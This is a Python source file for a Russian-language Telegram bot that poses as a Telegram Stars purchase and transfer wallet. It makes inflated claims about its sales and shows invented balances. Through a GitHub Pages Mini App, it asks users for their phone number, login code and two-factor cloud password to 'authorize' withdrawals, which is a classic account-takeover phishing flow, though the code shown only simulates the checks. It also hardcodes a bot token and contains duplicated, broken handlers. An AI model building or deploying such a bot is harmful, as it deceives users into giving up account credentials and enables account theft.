import asyncio
import logging
import os
from decimal import Decimal
from typing import Dict
from datetime import datetime

from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.fsm.storage.memory import MemoryStorage

# Настройка логирования (только ошибки)
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "8566540708:AAGJDm2B2nXOL4AQ93uuatI0WYce59vAdOc"

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Хранилища данных
auto_buyer_status = {}
user_balances = {}
user_transactions = {}
auth_sessions = {}

def get_user_balance(user_id: int) -> Dict[str, Decimal]:
    if user_id not in user_balances:
        user_balances[user_id] = {"stars": Decimal('100.00'), "gems": Decimal('50.00'), "referral": Decimal('25.00')}
    return user_balances[user_id]

def update_balance(user_id: int, amount: Decimal, currency: str = "stars", operation: str = "add") -> bool:
    balance = get_user_balance(user_id)
    if operation == "add":
        balance[currency] += amount
    elif operation == "subtract":
        if balance[currency] >= amount:
            balance[currency] -= amount
        else:
            return False
    
    if user_id not in user_transactions:
        user_transactions[user_id] = []
    user_transactions[user_id].append({
        "timestamp": datetime.now(),
        "amount": amount,
        "currency": currency,
        "operation": operation,
        "description": f"{operation.title()} {amount} {currency}"
    })
    return True

# Обработчик данных от веб-приложения
@dp.message(lambda message: message.web_app_data)
async def web_app_data_handler(message: types.Message):
    print(f"🔥 ПОЛУЧЕНЫ ДАННЫЕ ОТ ВЕБА: {message.from_user.id}")
    logger.info(f"🔥 ПОЛУЧЕНЫ ДАННЫЕ ОТ ВЕБА: {message.from_user.id}")
    
    try:
        import json
        data = json.loads(message.web_app_data.data)
        action = data.get('action')
        
        print(f"🎯 Действие: {action}")
        logger.info(f"🎯 Действие: {action}")
        
        user_id = message.from_user.id
        
        if action == 'send_phone':
            phone = data.get('phone')
            print(f"📱 ОТПРАВКА КОДА НА: {phone}")
            logger.info(f"📱 ОТПРАВКА КОДА НА: {phone}")
            
            # Генерируем код авторизации
            import random
            auth_code = str(random.randint(10000, 99999))
            
            # Сохраняем сессию
            auth_sessions[user_id] = {
                'phone': phone,
                'sms_code': auth_code,
                'step': 'sms_sent'
            }
            
            await message.answer(
                f"📨 <b>Код отправлен!</b>\n\n"
                f"Telegram отправил код авторизации на номер {phone}.\n"
                f"Код: <code>{auth_code}</code>\n\n"
                f"Введите этот код в Mini App.",
                parse_mode="HTML"
            )
            
        elif action == 'verify_sms':
            code = data.get('code')
            print(f"🔢 ПРОВЕРКА SMS КОДА: {code}")
            logger.info(f"🔢 ПРОВЕРКА SMS КОДА: {code}")
            
            session = auth_sessions.get(user_id)
            if session and session.get('sms_code') == code:
                # SMS код правильный
                session['step'] = 'sms_verified'
                
                # Имитируем проверку 2FA (50% шанс что нужен пароль)
                import random
                needs_password = random.choice([True, False])
                
                if needs_password:
                    session['needs_2fa'] = True
                    await message.answer(
                        "🔒 <b>Требуется облачный пароль</b>\n\n"
                        "У вас включена двухфакторная аутентификация.\n"
                        "Введите облачный пароль в Mini App.",
                        parse_mode="HTML"
                    )
                else:
                    # Авторизация успешна
                    session['step'] = 'authorized'
                    await message.answer(
                        "✅ <b>Авторизация успешна!</b>\n\n"
                        "🎉 Ваш аккаунт авторизован для операций с звездами.\n"
                        "Теперь вы можете безопасно выводить звезды.\n\n"
                        "🔒 Сессия будет активна 24 часа.",
                        parse_mode="HTML"
                    )
            else:
                await message.answer("❌ Неверный SMS код")
                
        elif action == 'verify_password':
            password = data.get('password')
            print(f"🔐 ПРОВЕРКА ПАРОЛЯ 2FA")
            logger.info(f"🔐 ПРОВЕРКА ПАРОЛЯ 2FA")
            
            session = auth_sessions.get(user_id)
            if session and session.get('step') == 'sms_verified':
                # Имитируем проверку пароля (всегда успешно для демо)
                session['step'] = 'authorized'
                await message.answer(
                    "✅ <b>Авторизация успешна!</b>\n\n"
                    "🎉 Ваш аккаунт авторизован для операций с звездами.\n"
                    "Теперь вы можете безопасно выводить звезды.\n\n"
                    "🔒 Сессия будет активна 24 часа.",
                    parse_mode="HTML"
                )
            else:
                await message.answer("❌ Неверный облачный пароль")
        
        elif action == 'topup':
            amount = data.get('amount')
            # Пополнение баланса
            if update_balance(user_id, Decimal(str(amount)), "stars", "add"):
                await message.answer(
                    f"✅ <b>Баланс пополнен!</b>\n\n💫 Получено: {amount} ⭐ звезд\n💰 Средства зачислены на ваш баланс",
                    parse_mode="HTML"
                )
            else:
                await message.answer("❌ Ошибка при пополнении баланса")
                
        elif action == 'withdraw':
            amount = data.get('amount')
            # Проверяем авторизацию для вывода
            session = auth_sessions.get(user_id)
            if session and session.get('step') == 'authorized':
                # Вывод звезд
                if update_balance(user_id, Decimal(str(amount)), "stars", "subtract"):
                    await message.answer(
                        f"✅ <b>Вывод выполнен!</b>\n\n💫 Выведено: {amount} ⭐ звезд\n💰 Операция завершена успешно",
                        parse_mode="HTML"
                    )
                else:
                    await message.answer("❌ Недостаточно средств для вывода")
            else:
                await message.answer("❌ Для вывода звезд необходимо авторизоваться")
        else:
            await message.answer("❌ Неизвестное действие")
            
    except Exception as e:
        logger.error(f"Ошибка обработки данных веб-приложения: {e}")
        await message.answer("❌ Ошибка обработки данных")

@dp.message(CommandStart())
async def start_command(message: types.Message):
    print(f"Получена команда /start от пользователя {message.from_user.id}")
    get_user_balance(message.from_user.id)
    
    welcome_text = (
        "<b>Привет! Это удобный бот для покупки/передачи звезд в Telegram.</b>\n\n"
        "<blockquote>С помощью него можно моментально покупать и передавать звезды.\n\n"
        "Бот работает почти год, и с помощью него куплена большая доля звезд в Telegram.</blockquote>\n\n"
        "С помощью бота куплено:\n"
        "<b>7,357,760</b> ⭐ (~ <b>$110,366</b>)"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Веб-Кошелек", callback_data="web_wallet")],
        [InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"), InlineKeyboardButton(text="🏪 Магазин", callback_data="shop")],
        [InlineKeyboardButton(text="💫 Вывести звезды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="🎁 Автоскупщик подарков", callback_data="gift_buyer")],
        [InlineKeyboardButton(text="💰 Пополнить Баланс", callback_data="add_balance")],
        [InlineKeyboardButton(text="⭐ Создать чек", callback_data="create_check")]
    ])
    
    # Отправляем изображение с сообщением
    try:
        photo_path = "images/photo_2026-01-28_15-11-47.jpg"
        if os.path.exists(photo_path):
            photo = FSInputFile(photo_path)
            await message.answer_photo(
                photo=photo,
                caption=welcome_text,
                reply_markup=keyboard,
                parse_mode="HTML"
            )
            print("✅ Изображение отправлено")
        else:
            await message.answer(welcome_text, reply_markup=keyboard, parse_mode="HTML")
            print("✅ Сообщение отправлено (без изображения)")
    except Exception as e:
        logger.error(f"Ошибка отправки изображения: {e}")
        await message.answer(welcome_text, reply_markup=keyboard, parse_mode="HTML")
        print("✅ Сообщение отправлено (fallback)")

@dp.callback_query(lambda c: c.data == "web_wallet")
async def web_wallet_handler(callback: types.CallbackQuery):
    await callback.answer()
    print(f"Нажата кнопка 'Веб-Кошелек' пользователем {callback.from_user.id}")
    
    # Создаем кнопку с WebApp, используя GitHub Pages
    webapp_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть Веб-Кошелек", web_app=WebAppInfo(url="https://shaczihakimov-collab.github.io/app/"))],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.answer(
        "💻 <b>Веб-Кошелек</b>\n\n"
        "🌐 <b>Telegram Mini App</b>\n"
        "Нажмите кнопку ниже, чтобы открыть веб-кошелек прямо в Telegram!\n\n"
        "🔹 Просмотр баланса\n"
        "🔹 Пополнение счета\n"
        "🔹 Вывод средств\n"
        "🔹 История операций",
        reply_markup=webapp_keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "wallet")
async def wallet_handler(callback: types.CallbackQuery):
    await callback.answer()
    print(f"Нажата кнопка 'Кошелек' пользователем {callback.from_user.id}")
    user_id = callback.from_user.id
    balance = get_user_balance(user_id)
    
    wallet_text = (
        "👛 <b>Ваш Кошелек</b>\n\n"
        f"<blockquote>В кошельке: {balance['stars']} ⭐, {balance['gems']} ✨</blockquote>\n\n"
        f"Реферальный Баланс: {balance['referral']}$"
    )
    
    wallet_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть Веб-Кошелек", web_app=WebAppInfo(url="https://shaczihakimov-collab.github.io/app/"))],
        [InlineKeyboardButton(text="📊 История транзакций", callback_data="transaction_history")],
        [InlineKeyboardButton(text="💰 Пополнить Баланс", callback_data="add_balance")],
        [InlineKeyboardButton(text="💫 Вывести звезды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.answer(wallet_text, reply_markup=wallet_keyboard, parse_mode="HTML")

@dp.callback_query(lambda c: c.data == "shop")
async def shop_handler(callback: types.CallbackQuery):
    await callback.answer()
    print(f"Нажата кнопка 'Магазин' пользователем {callback.from_user.id}")
    
    shop_text = (
        "🏪 <b>Магазин звезд</b>\n\n"
        "Выберите пакет звезд для покупки:"
    )
    
    shop_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ 25 звезд - $1", callback_data="buy_25")],
        [InlineKeyboardButton(text="⭐ 50 звезд - $2", callback_data="buy_50")],
        [InlineKeyboardButton(text="⭐ 100 звезд - $4", callback_data="buy_100")],
        [InlineKeyboardButton(text="⭐ 250 звезд - $10", callback_data="buy_250")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.answer(shop_text, reply_markup=shop_keyboard, parse_mode="HTML")

@dp.callback_query(lambda c: c.data.startswith("buy_"))
async def buy_handler(callback: types.CallbackQuery):
    await callback.answer()
    amount = callback.data.split("_")[1]
    print(f"Покупка {amount} звезд пользователем {callback.from_user.id}")
    
    await callback.message.answer(
        f"💳 <b>Покупка {amount} звезд</b>\n\nФункция покупки будет доступна в следующих версиях бота.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="shop")]
        ]),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "add_balance")
async def add_balance_handler(callback: types.CallbackQuery):
    await callback.answer()
    print(f"Пополнение баланса пользователем {callback.from_user.id}")
    user_id = callback.from_user.id
    
    # Добавляем 50 звезд для демонстрации
    update_balance(user_id, Decimal('50'), "stars", "add")
    
    await callback.message.answer(
        "✅ <b>Баланс пополнен!</b>\n\n💫 Получено: 50 ⭐ звезд\n💰 Средства зачислены на ваш баланс",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
        ]),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "transaction_history")
async def transaction_history_handler(callback: types.CallbackQuery):
    await callback.answer()
    print(f"История транзакций пользователя {callback.from_user.id}")
    user_id = callback.from_user.id
    
    transactions = user_transactions.get(user_id, [])
    
    if not transactions:
        history_text = "📊 <b>История транзакций</b>\n\nТранзакций пока нет."
    else:
        history_text = "📊 <b>История транзакций</b>\n\n"
        for i, tx in enumerate(transactions[-5:], 1):  # Показываем последние 5
            history_text += f"{i}. {tx['description']} - {tx['timestamp'].strftime('%d.%m %H:%M')}\n"
    
    await callback.message.answer(
        history_text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="wallet")]
        ]),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu_handler(callback: types.CallbackQuery):
    await callback.answer()
    print(f"Возврат в главное меню пользователем {callback.from_user.id}")
    
    welcome_text = (
        "<b>Привет! Это удобный бот для покупки/передачи звезд в Telegram.</b>\n\n"
        "<blockquote>С помощью него можно моментально покупать и передавать звезды.\n\n"
        "Бот работает почти год, и с помощью него куплена большая доля звезд в Telegram.</blockquote>\n\n"
        "С помощью бота куплено:\n"
        "<b>7,357,760</b> ⭐ (~ <b>$110,366</b>)"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Веб-Кошелек", callback_data="web_wallet")],
        [InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"), InlineKeyboardButton(text="🏪 Магазин", callback_data="shop")],
        [InlineKeyboardButton(text="💫 Вывести звезды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="🎁 Автоскупщик подарков", callback_data="gift_buyer")],
        [InlineKeyboardButton(text="💰 Пополнить Баланс", callback_data="add_balance")],
        [InlineKeyboardButton(text="⭐ Создать чек", callback_data="create_check")]
    ])
    
    await callback.message.answer(welcome_text, reply_markup=keyboard, parse_mode="HTML")

# Обработчик данных от веб-приложения
@dp.message(lambda message: message.web_app_data)
async def web_app_data_handler(message: types.Message):
    print(f"🔥 ПОЛУЧЕНЫ ДАННЫЕ ОТ ВЕБА: {message.from_user.id}")
    logger.info(f"🔥 ПОЛУЧЕНЫ ДАННЫЕ ОТ ВЕБА: {message.from_user.id}")
    
    try:
        import json
        data = json.loads(message.web_app_data.data)
        action = data.get('action')
        amount = data.get('amount')
        
        print(f"🎯 Действие: {action}, Сумма: {amount}")
        logger.info(f"🎯 Действие: {action}, Сумма: {amount}")
        
        user_id = message.from_user.id
        
        if action == 'request_auth':
            print(f"🔐 ЗАПРОС АВТОРИЗАЦИИ от {user_id}")
            logger.info(f"🔐 ЗАПРОС АВТОРИЗАЦИИ от {user_id}")
            # Запрос авторизации
            await message.answer(
                "🔐 <b>Авторизация аккаунта</b>\n\n"
                "Для вывода звезд необходимо авторизоваться через ваш номер телефона.\n\n"
                "📱 <b>Инструкция:</b>\n"
                "1. Нажмите кнопку ниже\n"
                "2. В открывшемся меню выберите \"Поделиться контактом\"\n"
                "3. Подтвердите отправку своего номера",
                reply_markup=ReplyKeyboardMarkup(
                    keyboard=[
                        [KeyboardButton(text="📱 Поделиться контактом", request_contact=True)]
                    ],
                    resize_keyboard=True,
                    one_time_keyboard=True
                ),
                parse_mode="HTML"
            )
            
        elif action == 'get_auth_code':
            print(f"🔢 ЗАПРОС КОДА от {user_id}")
            logger.info(f"🔢 ЗАПРОС КОДА от {user_id}")
            # Отправляем код в Mini App
            if user_id in auth_codes:
                code = auth_codes[user_id]
                await message.answer(f"auth_code:{code}")
            else:
                await message.answer("auth_code:none")
                
        elif action == 'verify_code':
            print(f"🔐 ПРОВЕРКА КОДА от {user_id}")
            logger.info(f"🔐 ПРОВЕРКА КОДА от {user_id}")
            code = data.get('code')
            
            if user_id in auth_codes and auth_codes[user_id] == code:
                # Код правильный, удаляем его
                del auth_codes[user_id]
                await message.answer(
                    "✅ <b>Авторизация успешна!</b>\n\n"
                    "🎉 Ваш аккаунт авторизован для операций с звездами.\n"
                    "Теперь вы можете безопасно выводить звезды через веб-кошелек.\n\n"
                    "🔒 Сессия будет активна 24 часа.",
                    parse_mode="HTML"
                )
            else:
                await message.answer("❌ Неверный код авторизации")
            
        elif action == 'topup':
            # Пополнение баланса
            if update_balance(user_id, Decimal(str(amount)), "stars", "add"):
                await message.answer(
                    f"✅ <b>Баланс пополнен!</b>\n\n💫 Получено: {amount} ⭐ звезд\n💰 Средства зачислены на ваш баланс",
                    parse_mode="HTML"
                )
            else:
                await message.answer("❌ Ошибка при пополнении баланса")
                
        elif action == 'withdraw':
            # Вывод звезд
            if update_balance(user_id, Decimal(str(amount)), "stars", "subtract"):
                await message.answer(
                    f"✅ <b>Вывод выполнен!</b>\n\n💫 Выведено: {amount} ⭐ звезд\n💰 Операция завершена успешно",
                    parse_mode="HTML"
                )
            else:
                await message.answer("❌ Недостаточно средств для вывода")
        else:
            await message.answer("❌ Неизвестное действие")
            
    except Exception as e:
        logger.error(f"Ошибка обработки данных веб-приложения: {e}")
        await message.answer("❌ Ошибка обработки данных")

# Обработчик всех сообщений для отладки
@dp.message()
async def debug_handler(message: types.Message):
    print(f"🐛 ЛЮБОЕ СООБЩЕНИЕ от {message.from_user.id}: {message.text or 'не текст'}")
    logger.info(f"🐛 ЛЮБОЕ СООБЩЕНИЕ от {message.from_user.id}: {message.text or 'не текст'}")
    
    # Если это не обработанное сообщение, показываем помощь
    if message.text and not message.text.startswith('/'):
        await message.answer(
            "ℹ️ Для авторизации используйте:\n"
            "1. Откройте веб-кошелек через /start\n"
            "2. Нажмите 'Авторизоваться' в Mini App\n"
            "3. Введите номер телефона\n"
            "4. Введите код из SMS"
        )

# Простые обработчики для остальных кнопок
@dp.callback_query(lambda c: c.data in ["gift_buyer", "withdraw_stars", "create_check"])
async def simple_handlers(callback: types.CallbackQuery):
    await callback.answer()
    print(f"Нажата кнопка '{callback.data}' пользователем {callback.from_user.id}")
    
    messages = {
        "gift_buyer": "🎁 <b>Автоскупщик подарков</b>\n\nФункция в разработке. Скоро будет доступна!",
        "withdraw_stars": "💫 <b>Вывод звезд</b>\n\nФункция в разработке. Скоро будет доступна!", 
        "create_check": "⭐ <b>Создание чека</b>\n\nФункция в разработке. Скоро будет доступна!"
    }
    
    await callback.message.answer(
        messages[callback.data],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
        ]),
        parse_mode="HTML"
    )

async def main():
    print("🚀 Запуск бота...")
    logger.info("🚀 Запуск бота...")
    
    try:
        # Проверяем подключение к боту
        me = await bot.get_me()
        print(f"✅ Бот подключен: @{me.username}")
        logger.info(f"✅ Бот подключен: @{me.username}")
        
        # Устанавливаем команды
        from aiogram.types import BotCommand
        commands = [BotCommand(command="start", description="🚀 Запустить бота")]
        await bot.set_my_commands(commands)
        
        print("🤖 Запуск polling...")
        logger.info("🤖 Запуск polling...")
        
        await dp.start_polling(bot)
        
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        logger.error(f"❌ Ошибка: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())